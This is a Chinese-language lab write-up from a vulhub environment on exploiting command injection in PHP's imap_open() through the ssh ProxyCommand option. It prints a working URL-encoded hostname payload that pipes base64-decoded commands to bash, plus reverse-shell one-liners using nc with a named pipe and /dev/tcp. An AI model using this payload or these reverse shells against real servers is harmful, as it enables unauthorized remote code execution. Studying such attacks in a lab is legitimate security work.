# [vulhub]: PHP imap_open() RCE之利用

Author：badbird

Time：2021-5-5

---

### 0x01 利用前的一点点须知

vulhub搭建环境

访问IP:8080，bp抓包如下：

![image-20210505195603814](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210505195603814.png)

修改hostname变量值：

```bash
hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|bash}
```

解释一下：

payload利用的是imap_open()函数的性质，imap_open()函数定义如下：

```php
imap_open(string $mailbox,string $user,string $password,int $flags=0,int $retries=0,array $options=[])
```

payload中

x是随意的字符串，（测试过了不要也行）

+用来替换空格

-oProxyCommand实际上 -o 是ssh的参数，ProxyCommand是ssh的一个选项，测试这个选项如下：

![image-20210505223516641](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210505223516641.png)

可以看到，**虽然提示连接不成功但是该执行的命令还是执行了**。

ProxyCommand=后面跟的就是远程执行的命令如上图所示，在利用payload中，ProxyCommand=的是echo，%09为tab，后跟想执行命令的base64编码（要注意编码后如果有+或者=要URL编码一下）。

为什么是echo？

因为有base64编码，使用sh或bash执行命令的时候执行的是原字符串所以还需要base64解码。所以用到了echo [base64_code] |base64 -d来进行解码并输出到sh或bash执行（|sh 或 |bash的意思）**众所周知“|”能把前面执行结果的输出当作后面执行命令的输入。** 

总而言之，该漏洞利用的是imap_open()函数的第一个参数的过滤不严和处理参数的特性，关于该函数的第一个参数$mailbox: **imap_open()函数的第一个参数在php.ini文件中imap.enable_insecure_rsh参数为On的情况下，会开启IMAP preauthenticated mode，反正就是会调用rsh指令，然后rsh指令（应该）一般都是链接到ssh指令上的，ssh指令可以通过-o参数来执行一些指令。所以对第一个参数没有过滤好的话就会造成指令执行.**



### 0x02 反弹shell

这里又复习了一下几种linux反弹shell的方法：

1. 利用管道,需要目标装有nc且能执行

   mknod backpipe p

   或

   mkfifo backpipe（mknod没权限时用） 一句话为：

   ```shell
   /bin/bash -i 0</tmp/backpipe | nc IP PORT 1>/tmp/backpipe
   意思是开启一个交互式shell，且标准输入来自管道，执行后的结果通过nc连接重定向到攻击者也就是管道的另一端,且攻击者的标准输出重定向到管道
   ```

2. 利用/dev/tcp/IP/PORT

   ```shell
   /bin/bash -i >& /dev/tcp/IP/PORT 0>&1
   意思是开启一个交互式shell，且将标准输出和标准错误输出重定向到tcp连接，标准输入重定向到已经重定向到tcp连接的标准输出
   ```

关于linux的重定向还是需要用多了自然通透。

### 0x03 利用msf的攻击模块

exploits/linux/http/php_imap_open_rce 

利用失败，大概是因为攻击代码偏向于实际利用环境，而不适合vulhub的环境。猜想源于攻击代码中有判断301.